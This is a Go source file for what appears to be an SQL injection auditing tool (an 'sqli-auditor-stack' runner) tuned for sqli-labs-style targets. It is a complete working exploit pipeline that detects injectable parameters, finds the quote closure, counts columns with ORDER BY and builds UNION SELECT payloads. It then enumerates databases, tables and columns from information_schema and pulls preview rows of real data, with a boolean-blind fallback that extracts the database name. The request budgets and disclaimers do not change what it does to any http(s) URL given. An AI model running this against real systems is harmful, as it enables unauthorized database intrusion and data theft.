package audit

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	DefaultRequestBudget = 120
	MaxRequestBudget     = 240
	MaxColumns           = 16
	MaxDatabases         = 6
	MaxTables            = 8
	MaxFields            = 16
	MaxPreviewRows       = 5
	MaxPreviewColumns    = 6
	DefaultConcurrency   = 8
	MaxConcurrency       = 16
	MaxBlindChars        = 24
)

// Stage keys. The order mirrors the UI stack and must stay stable so the
// frontend can map each key to its localized label.
const (
	StageParamDetection = "parameter_detection"
	StageInjectionType  = "injection_type"
	StageColumnCount    = "column_count"
	StageDisplayColumns = "display_columns"
	StageDatabases      = "databases"
	StageTables         = "tables"
	StageFields         = "fields"
	StageDataPreview    = "data_preview"
)

// Stage statuses.
const (
	StatusComplete = "complete"
	StatusPartial  = "partial"
	StatusFailed   = "failed"
	StatusPending  = "pending"
)

// stageOrder is the canonical order the UI renders and the report serializes.
var stageOrder = []string{
	StageParamDetection,
	StageInjectionType,
	StageColumnCount,
	StageDisplayColumns,
	StageDatabases,
	StageTables,
	StageFields,
	StageDataPreview,
}

const markerPrefix = "qZ9sTaRt_"
const markerSuffix = "_qZ9eNd"
const listSeparator = "xQ7sEpX"

var safeIdentifier = regexp.MustCompile(`^[A-Za-z0-9_$-]{1,64}$`)

// closureCandidates lists the closing suffixes the scanner tries, in increasing
// specificity, to cover numeric (Less-2), single-quoted (Less-1), parenthesized
// (Less-3), and double-quoted contexts. The correct suffix is the first whose
// boolean true/false probes produce clearly different responses.
var closureCandidates = []string{"", "'", "')", "\"", "\")"}

// closureType maps a closing suffix to a human-readable injection-type label.
func closureType(suffix string) string {
	switch suffix {
	case "":
		return "numeric"
	case "'":
		return "string (single-quote)"
	case "')":
		return "string (single-quote + paren)"
	case "\"":
		return "string (double-quote)"
	case "\")":
		return "string (double-quote + paren)"
	}
	return "unknown"
}

type StackConfig struct {
	Target        string
	Cookie        string
	Delay         time.Duration
	RequestBudget int
	PreviewRows   int
	Concurrency   int
}

type Stage struct {
	Key      string `json:"key"`
	Status   string `json:"status"`
	Message  string `json:"message"`
	Requests int    `json:"requests"`
}

type ParameterProfile struct {
	Name           string `json:"name"`
	Injectable     bool   `json:"injectable"`
	InjectionType  string `json:"injection_type,omitempty"`
	ColumnCount    int    `json:"column_count,omitempty"`
	DisplayColumns []int  `json:"display_columns,omitempty"`
	Evidence       string `json:"evidence,omitempty"`
}

type TableResult struct {
	Name    string              `json:"name"`
	Columns []string            `json:"columns"`
	Rows    []map[string]string `json:"rows"`
}

type DatabaseResult struct {
	Name   string        `json:"name"`
	Tables []TableResult `json:"tables"`
}

type StackReport struct {
	Schema        string             `json:"schema"`
	Target        string             `json:"target"`
	DBMS          string             `json:"dbms"`
	Requests      int                `json:"requests"`
	RequestBudget int                `json:"request_budget"`
	DurationMS    int64              `json:"duration_ms"`
	Partial       bool               `json:"partial"`
	Parameters    []ParameterProfile `json:"parameters"`
	Stages        []Stage            `json:"stages"`
	Databases     []DatabaseResult   `json:"databases"`
	Notes         []string           `json:"notes"`
}

type stackRunner struct {
	ctx     context.Context
	client  *http.Client
	base    *url.URL
	cookie  string
	delay   time.Duration
	budget  int
	conc    int
	mu      sync.Mutex
	count   int
	partial bool
	stages  map[string]Stage
}

func (r *stackRunner) mark(key, status, message string, reqStart int) {
	r.stages[key] = Stage{Key: key, Status: status, Message: message, Requests: r.requests() - reqStart}
}

// bump reserves one request against the budget, failing when it is exhausted.
func (r *stackRunner) bump() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.count >= r.budget {
		return errBudget
	}
	r.count++
	return nil
}
func (r *stackRunner) requests() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.count
}
func (r *stackRunner) isPartial() bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.partial
}
func (r *stackRunner) setPartial() {
	r.mu.Lock()
	r.partial = true
	r.mu.Unlock()
}

func RunStack(ctx context.Context, cfg StackConfig) (StackReport, error) {
	started := time.Now()
	base, err := validateTarget(cfg.Target)
	if err != nil {
		return StackReport{}, err
	}
	if cfg.Delay < 0 || cfg.Delay > 2*time.Second {
		return StackReport{}, errors.New("delay must be between 0 and 2 seconds")
	}
	if cfg.RequestBudget == 0 {
		cfg.RequestBudget = DefaultRequestBudget
	}
	if cfg.RequestBudget < 20 || cfg.RequestBudget > MaxRequestBudget {
		return StackReport{}, fmt.Errorf("request budget must be between 20 and %d", MaxRequestBudget)
	}
	if cfg.PreviewRows == 0 {
		cfg.PreviewRows = 3
	}
	if cfg.PreviewRows < 0 || cfg.PreviewRows > MaxPreviewRows {
		return StackReport{}, fmt.Errorf("preview rows must be between 0 and %d", MaxPreviewRows)
	}
	if cfg.Concurrency < 0 {
		return StackReport{}, errors.New("concurrency must be non-negative")
	}
	conc := cfg.Concurrency
	if conc == 0 {
		conc = DefaultConcurrency
	}
	if conc > MaxConcurrency {
		conc = MaxConcurrency
	}
	client, err := guardedClient(ctx, base)
	if err != nil {
		return StackReport{}, err
	}
	runner := &stackRunner{ctx: ctx, client: client, base: base, cookie: cfg.Cookie, delay: cfg.Delay, budget: cfg.RequestBudget, conc: conc, stages: map[string]Stage{}}
	report := StackReport{
		Schema: "sqli-auditor-stack/1.0", Target: redact(base), DBMS: "MySQL-compatible",
		RequestBudget: cfg.RequestBudget, Parameters: []ParameterProfile{}, Stages: []Stage{},
		Databases: []DatabaseResult{},
		Notes: []string{
			"Full-stack mode uses UNION-based metadata discovery and bounded data previews.",
			"Findings are heuristic and require manual confirmation; they are not proof of a vulnerability.",
		},
	}

	params := base.Query()
	keys := make([]string, 0, len(params))
	for key := range params {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	if len(keys) > MaxParameters {
		return StackReport{}, fmt.Errorf("at most %d parameters per scan", MaxParameters)
	}

	// Stage 1: parameter detection.
	stageStart := runner.requests()
	baseline, err := runner.getURL(base)
	if err != nil {
		runner.mark(StageParamDetection, StatusFailed, "baseline request failed", stageStart)
		return finishStack(report, runner, started), err
	}
	var selected *ParameterProfile
	for _, key := range keys {
		value := params.Get(key)
		profile := ParameterProfile{Name: key}
		quote, requestErr := runner.probe(key, value+"'")
		if requestErr != nil {
			if errors.Is(requestErr, errBudget) {
				runner.setPartial()
				break
			}
			continue
		}
		dbHint := databaseHint(quote.body, baseline.body)
		delta := abs(quote.length - baseline.length)
		profile.Injectable = dbHint != "" || quote.status >= 500 && baseline.status < 500 || delta > max(120, baseline.length/5)
		if profile.Injectable {
			profile.Evidence = "quote-boundary response changed"
			if dbHint != "" {
				profile.Evidence = "database error signature: " + dbHint
			}
		}
		report.Parameters = append(report.Parameters, profile)
		if selected == nil && profile.Injectable {
			selected = &report.Parameters[len(report.Parameters)-1]
		}
	}
	runner.mark(StageParamDetection, stageStatus(selected != nil), fmt.Sprintf("tested %d query parameter(s)", len(keys)), stageStart)
	if selected == nil {
		return finishStack(report, runner, started), nil
	}

	// Stage 2: injection closure. Probe candidate closing suffixes with a boolean
	// true/false pair and keep the first that changes the response. This covers
	// numeric (Less-2), single-quoted (Less-1), and parenthesized (Less-3).
	stageStart = runner.requests()
	closure, closureOK := runner.detectClosure(selected.Name, params.Get(selected.Name))
	if closureOK {
		selected.InjectionType = closureType(closure)
	}
	runner.mark(StageInjectionType, stageStatus(closureOK), fmt.Sprintf("injection type: %s", selected.InjectionType), stageStart)
	if !closureOK {
		return finishStack(report, runner, started), nil
	}

	// Stage 3: column count.
	stageStart = runner.requests()
	selected.ColumnCount = runner.detectColumnCount(selected.Name, params.Get(selected.Name), closure, baseline)
	runner.mark(StageColumnCount, stageStatus(selected.ColumnCount > 0), fmt.Sprintf("column count: %d", selected.ColumnCount), stageStart)
	if selected.ColumnCount == 0 {
		return finishStack(report, runner, started), nil
	}

	// Stage 4: display columns.
	stageStart = runner.requests()
	selected.DisplayColumns = runner.displayColumns(selected.Name, params.Get(selected.Name), closure, selected.ColumnCount)
	runner.mark(StageDisplayColumns, stageStatus(len(selected.DisplayColumns) > 0), fmt.Sprintf("reflected columns: %v", selected.DisplayColumns), stageStart)
	if len(selected.DisplayColumns) == 0 {
		// UNION reflection unavailable: fall back to bounded boolean-blind
		// inference of the current database name only.
		if name, blindErr := runner.booleanDatabase(selected.Name, params.Get(selected.Name), closure); blindErr == nil && name != "" {
			report.Databases = []DatabaseResult{{Name: name, Tables: []TableResult{}}}
			report.Notes = append(report.Notes, "UNION reflection unavailable; used boolean-blind database() inference.")
		}
		return finishStack(report, runner, started), nil
	}

	param, value, count, display := selected.Name, params.Get(selected.Name), selected.ColumnCount, selected.DisplayColumns[0]

	// Stage 5: databases. Promote the active schema (database()) so the most
	// relevant database is enumerated first even when the server hosts many.
	stageStart = runner.requests()
	databases, dbErr := runner.queryList(param, value, closure, count, display, "schema_name", "information_schema.schemata", "", MaxDatabases)
	if errors.Is(dbErr, errBudget) {
		runner.setPartial()
	}
	if !runner.isPartial() {
		if current, _ := runner.queryScalar(param, value, closure, count, display, "database()", "", ""); current != "" {
			databases = promoteFirst(databases, current, MaxDatabases)
		}
	}
	runner.mark(StageDatabases, partialStatus(runner.isPartial(), len(databases) > 0), fmt.Sprintf("discovered %d database(s)", len(databases)), stageStart)

	// Stage 6: tables (one pass over every database, in parallel).
	stageStart = runner.requests()
	dbResults := make([]*DatabaseResult, len(databases))
	runner.parallelEach(len(databases), runner.conc, func(i int) error {
		dbName := databases[i]
		if !safeIdentifier.MatchString(dbName) {
			return nil
		}
		db := &DatabaseResult{Name: dbName, Tables: []TableResult{}}
		tables, queryErr := runner.queryList(param, value, closure, count, display, "table_name", "information_schema.tables", "WHERE table_schema="+hexSQL(dbName), MaxTables)
		if queryErr != nil {
			return queryErr
		}
		for _, tableName := range tables {
			if !safeIdentifier.MatchString(tableName) {
				continue
			}
			db.Tables = append(db.Tables, TableResult{Name: tableName, Columns: []string{}, Rows: []map[string]string{}})
		}
		dbResults[i] = db
		return nil
	})
	databasesResult := make([]DatabaseResult, 0, len(dbResults))
	for _, db := range dbResults {
		if db != nil {
			databasesResult = append(databasesResult, *db)
		}
	}
	runner.mark(StageTables, partialStatus(runner.isPartial(), len(databasesResult) > 0), fmt.Sprintf("enumerated tables across %d database(s)", len(databasesResult)), stageStart)

	// Stage 7: fields (one pass over every enumerated table, in parallel).
	stageStart = runner.requests()
	type tableRef struct{ di, ti int }
	refs := make([]tableRef, 0)
	for di := range databasesResult {
		for ti := range databasesResult[di].Tables {
			refs = append(refs, tableRef{di, ti})
		}
	}
	runner.parallelEach(len(refs), runner.conc, func(i int) error {
		ref := refs[i]
		db := &databasesResult[ref.di]
		table := &db.Tables[ref.ti]
		columns, columnErr := runner.queryList(param, value, closure, count, display, "column_name", "information_schema.columns", "WHERE table_schema="+hexSQL(db.Name)+" AND table_name="+hexSQL(table.Name), MaxFields)
		if columnErr != nil {
			return columnErr
		}
		table.Columns = columns
		return nil
	})
	fieldsEnumerated := false
	for di := range databasesResult {
		for ti := range databasesResult[di].Tables {
			if len(databasesResult[di].Tables[ti].Columns) > 0 {
				fieldsEnumerated = true
			}
		}
	}
	runner.mark(StageFields, partialStatus(runner.isPartial(), fieldsEnumerated), "enumerated columns for tables", stageStart)

	// Stage 8: bounded data preview (parallel over tables and rows).
	stageStart = runner.requests()
	type previewRef struct{ di, ti, offset int }
	prevs := make([]previewRef, 0)
	for di := range databasesResult {
		for ti := range databasesResult[di].Tables {
			table := &databasesResult[di].Tables[ti]
			previewCols := table.Columns
			if len(previewCols) > MaxPreviewColumns {
				previewCols = previewCols[:MaxPreviewColumns]
			}
			for offset := 0; offset < cfg.PreviewRows && len(previewCols) > 0; offset++ {
				prevs = append(prevs, previewRef{di, ti, offset})
			}
		}
	}
	rows := make([]map[string]string, len(prevs))
	runner.parallelEach(len(prevs), runner.conc, func(i int) error {
		ref := prevs[i]
		db := &databasesResult[ref.di]
		table := &db.Tables[ref.ti]
		previewCols := table.Columns
		if len(previewCols) > MaxPreviewColumns {
			previewCols = previewCols[:MaxPreviewColumns]
		}
		row, rowErr := runner.queryRow(param, value, closure, count, display, db.Name, table.Name, previewCols, ref.offset)
		if rowErr != nil {
			return rowErr
		}
		if len(row) > 0 {
			rows[i] = row
		}
		return nil
	})
	rowsPreviewed := 0
	for i, ref := range prevs {
		if rows[i] == nil {
			continue
		}
		databasesResult[ref.di].Tables[ref.ti].Rows = append(databasesResult[ref.di].Tables[ref.ti].Rows, rows[i])
		rowsPreviewed++
	}
	runner.mark(StageDataPreview, partialStatus(runner.isPartial(), rowsPreviewed > 0), fmt.Sprintf("previewed %d row(s)", rowsPreviewed), stageStart)

	report.Databases = databasesResult
	return finishStack(report, runner, started), nil
}

var errBudget = errors.New("request budget reached")

func (r *stackRunner) getURL(target *url.URL) (sample, error) {
	if err := r.bump(); err != nil {
		return sample{}, err
	}
	if err := sleep(r.ctx, r.delay); err != nil {
		return sample{}, err
	}
	return fetch(r.ctx, r.client, target, r.cookie)
}
func (r *stackRunner) probe(param, payload string) (sample, error) {
	target := cloneURL(r.base)
	q := target.Query()
	q.Set(param, payload)
	target.RawQuery = q.Encode()
	return r.getURL(target)
}

// parallelEach runs fn(i) for i in [0, n) with up to conc concurrent workers.
// Scheduling stops early once the request budget is exhausted; the budget itself
// is enforced inside bump(). Returns true if the budget was hit.
func (r *stackRunner) parallelEach(n, conc int, fn func(i int) error) bool {
	if n == 0 {
		return false
	}
	if conc <= 0 {
		conc = 1
	}
	if conc > n {
		conc = n
	}
	var wg sync.WaitGroup
	sem := make(chan struct{}, conc)
	var budgetHit atomic.Bool
	for i := 0; i < n; i++ {
		if budgetHit.Load() {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer wg.Done()
			defer func() { <-sem }()
			if err := fn(i); err != nil && errors.Is(err, errBudget) {
				r.setPartial()
				budgetHit.Store(true)
			}
		}(i)
	}
	wg.Wait()
	return budgetHit.Load()
}

// detectClosure probes candidate closing suffixes with a boolean true/false
// pair and returns the first whose responses clearly differ. This covers numeric
// (Less-2), single-quoted (Less-1), and parenthesized (Less-3) contexts.
func (r *stackRunner) detectClosure(param, value string) (string, bool) {
	for _, suffix := range closureCandidates {
		trueBody, e1 := r.probe(param, value+suffix+" AND 1=1-- -")
		falseBody, e2 := r.probe(param, value+suffix+" AND 1=2-- -")
		if e1 == nil && e2 == nil && distance(trueBody, falseBody) > 16 {
			return suffix, true
		}
	}
	return "", false
}

// --- Boolean-blind fallback (used only when UNION reflection is unavailable) ---

// blindCond builds a boolean-expression payload for the given closing suffix.
func blindCond(value, closure, condition string) string {
	return value + closure + " AND " + condition + "-- -"
}

// blindCheck sends one boolean condition and reports whether its response lies
// closer to the known-true than the known-false baseline.
func (r *stackRunner) blindCheck(param, value, closure, condition string, trueBody, falseBody sample) (bool, error) {
	cond, err := r.probe(param, blindCond(value, closure, condition))
	if err != nil {
		return false, err
	}
	return distance(cond, trueBody) < distance(cond, falseBody), nil
}

// blindChar binary-searches the ASCII code of the database() character at pos.
func (r *stackRunner) blindChar(param, value, closure string, pos int, trueBody, falseBody sample) (byte, bool, error) {
	lo, hi := 0, 127
	for lo < hi {
		mid := (lo + hi) / 2
		ok, err := r.blindCheck(param, value, closure, fmt.Sprintf("ORD(SUBSTRING(database(),%d,1))>%d", pos, mid), trueBody, falseBody)
		if err != nil {
			return 0, false, err
		}
		if ok {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	if lo <= 0 || lo > 126 {
		return 0, false, nil
	}
	return byte(lo), true, nil
}

// booleanDatabase infers the current database name with boolean-blind probes. It
// is bounded by MaxBlindChars and only runs when UNION reflection is absent.
func (r *stackRunner) booleanDatabase(param, value, closure string) (string, error) {
	trueBody, err := r.probe(param, blindCond(value, closure, "1=1"))
	if err != nil {
		return "", err
	}
	falseBody, err := r.probe(param, blindCond(value, closure, "1=2"))
	if err != nil {
		return "", err
	}
	if distance(trueBody, falseBody) == 0 {
		return "", nil // responses are indistinguishable; blind inference cannot proceed
	}
	length := 0
	for n := 1; n <= MaxBlindChars; n++ {
		ok, err := r.blindCheck(param, value, closure, fmt.Sprintf("LENGTH(database())=%d", n), trueBody, falseBody)
		if err != nil {
			return "", err
		}
		if ok {
			length = n
			break
		}
	}
	if length == 0 {
		return "", nil
	}
	name := make([]byte, 0, length)
	for i := 1; i <= length; i++ {
		ch, ok, err := r.blindChar(param, value, closure, i, trueBody, falseBody)
		if err != nil {
			return "", err
		}
		if !ok {
			break
		}
		name = append(name, ch)
	}
	return string(name), nil
}

func (r *stackRunner) detectColumnCount(param, value, closure string, baseline sample) int {
	for i := 1; i <= MaxColumns+1; i++ {
		payload := value + closure + fmt.Sprintf(" ORDER BY %d-- -", i)
		result, err := r.probe(param, payload)
		if err != nil {
			return 0
		}
		if result.status >= 500 || databaseHint(result.body, baseline.body) != "" {
			return i - 1
		}
	}
	return 0
}
func (r *stackRunner) displayColumns(param, value, closure string, count int) []int {
	cols := make([]string, count)
	for i := range cols {
		cols[i] = hexSQL(fmt.Sprintf("sqli_col_%02d", i))
	}
	result, err := r.probe(param, union(value, closure, cols, "", ""))
	if err != nil {
		return nil
	}
	found := []int{}
	for i := range cols {
		if strings.Contains(result.body, fmt.Sprintf("sqli_col_%02d", i)) {
			found = append(found, i)
		}
	}
	return found
}
func (r *stackRunner) queryList(param, value, closure string, count, display int, expr, from, where string, limit int) ([]string, error) {
	wrapped := fmt.Sprintf("CONCAT(%s,GROUP_CONCAT(CAST(%s AS CHAR) SEPARATOR %s),%s)", hexSQL(markerPrefix), expr, hexSQL(listSeparator), hexSQL(markerSuffix))
	scalar, err := r.queryScalar(param, value, closure, count, display, wrapped, from, where)
	if err != nil || scalar == "" {
		return nil, err
	}
	items := strings.Split(scalar, listSeparator)
	clean := []string{}
	for _, item := range items {
		item = strings.TrimSpace(stripTags(item))
		if item != "" && !contains(clean, item) {
			clean = append(clean, item)
		}
		if len(clean) >= limit {
			break
		}
	}
	return clean, nil
}
func (r *stackRunner) queryScalar(param, value, closure string, count, display int, expr, from, where string) (string, error) {
	cols := make([]string, count)
	for i := range cols {
		cols[i] = "NULL"
	}
	if !strings.HasPrefix(expr, "CONCAT(") {
		expr = fmt.Sprintf("CONCAT(%s,CAST(%s AS CHAR),%s)", hexSQL(markerPrefix), expr, hexSQL(markerSuffix))
	}
	cols[display] = expr
	result, err := r.probe(param, union(value, closure, cols, from, where))
	if err != nil {
		return "", err
	}
	return extractMarker(result.body), nil
}
func (r *stackRunner) queryRow(param, value, closure string, count, display int, db, table string, columns []string, offset int) (map[string]string, error) {
	parts := make([]string, 0, len(columns))
	for _, column := range columns {
		if !safeIdentifier.MatchString(column) {
			continue
		}
		parts = append(parts, "IFNULL(CAST("+quoteIdent(column)+" AS CHAR),0x4e554c4c)")
	}
	if len(parts) == 0 {
		return nil, nil
	}
	expr := "CONCAT(" + hexSQL(markerPrefix) + ",CONCAT_WS(0x1f," + strings.Join(parts, ",") + ")," + hexSQL(markerSuffix) + ")"
	where := fmt.Sprintf("LIMIT %d,1", offset)
	raw, err := r.queryScalar(param, value, closure, count, display, expr, quoteIdent(db)+"."+quoteIdent(table), where)
	if err != nil || raw == "" {
		return nil, err
	}
	values := strings.Split(raw, "\x1f")
	row := map[string]string{}
	for i, column := range columns {
		if i < len(values) {
			value := stripTags(values[i])
			if len(value) > 512 {
				value = value[:512] + "…"
			}
			row[column] = value
		}
	}
	return row, nil
}
func validateTarget(raw string) (*url.URL, error) {
	parsed, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || parsed.Hostname() == "" {
		return nil, errors.New("valid target URL is required")
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, errors.New("only http and https targets are supported")
	}
	if len(parsed.Query()) == 0 {
		return nil, errors.New("target URL must contain query parameters")
	}
	return parsed, nil
}
// union builds a UNION SELECT payload that negates the leading SELECT with a
// false condition so the injected row becomes the first row returned.
func union(value, closure string, cols []string, from, tail string) string {
	payload := value + closure + " AND 1=2 UNION SELECT " + strings.Join(cols, ",")
	if from != "" {
		payload += " FROM " + from
	}
	if tail != "" {
		payload += " " + tail
	}
	return payload + "-- -"
}
func hexSQL(value string) string     { return "0x" + hex.EncodeToString([]byte(value)) }
func quoteIdent(value string) string { return "`" + strings.ReplaceAll(value, "`", "``") + "`" }
func extractMarker(body string) string {
	start := strings.Index(body, markerPrefix)
	if start < 0 {
		return ""
	}
	start += len(markerPrefix)
	end := strings.Index(body[start:], markerSuffix)
	if end < 0 {
		return ""
	}
	return body[start : start+end]
}
func stripTags(value string) string { return regexp.MustCompile(`<[^>]*>`).ReplaceAllString(value, "") }
func distance(a, b sample) int      { return abs(a.length-b.length) + abs(a.status-b.status)*1000 }
func databaseHint(probe, baseline string) string {
	for db, pattern := range errorsByDB {
		if pattern.MatchString(probe) && !pattern.MatchString(baseline) {
			return db
		}
	}
	return ""
}
func contains(values []string, value string) bool {
	for _, item := range values {
		if item == value {
			return true
		}
	}
	return false
}

// promoteFirst moves first to the head of the list (deduplicating it) and
// truncates the result to limit elements.
func promoteFirst(list []string, first string, limit int) []string {
	out := make([]string, 0, len(list)+1)
	if first != "" {
		out = append(out, first)
	}
	for _, item := range list {
		if item != first {
			out = append(out, item)
		}
	}
	if len(out) > limit {
		out = out[:limit]
	}
	return out
}
func stageStatus(ok bool) string {
	if ok {
		return StatusComplete
	}
	return StatusFailed
}
func partialStatus(partial, ok bool) string {
	if partial {
		return StatusPartial
	}
	return stageStatus(ok)
}
func finishStack(report StackReport, runner *stackRunner, started time.Time) StackReport {
	report.Requests = runner.requests()
	report.DurationMS = time.Since(started).Milliseconds()
	if runner.requests() >= runner.budget {
		runner.setPartial()
		report.Notes = append(report.Notes, "The request budget was reached; results are partial.")
	}
	if runner.isPartial() {
		report.Partial = true
	}
	report.Stages = make([]Stage, 0, len(stageOrder))
	for _, key := range stageOrder {
		if stage, ok := runner.stages[key]; ok {
			report.Stages = append(report.Stages, stage)
		} else {
			report.Stages = append(report.Stages, Stage{Key: key, Status: StatusPending, Message: "not reached", Requests: 0})
		}
	}
	return report
}
